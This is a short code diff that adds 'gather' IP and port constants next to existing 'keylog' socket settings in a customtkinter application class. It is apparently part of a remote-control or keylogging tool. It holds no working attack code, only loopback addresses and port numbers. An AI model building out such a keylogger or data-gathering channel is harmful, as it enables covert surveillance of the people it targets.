@@ -24,6 +24,8 @@ class App(customtkinter.CTk):
     cli_SOPORT = 12345
     keylog_SOIP = "127.0.0.89"
     keylog_SOPORT = 65230
+    gather_SOIP = "127.0.0.69"
+    gather_SOPORT = 42069
 
     # Important Strings
     sep = ":***:"
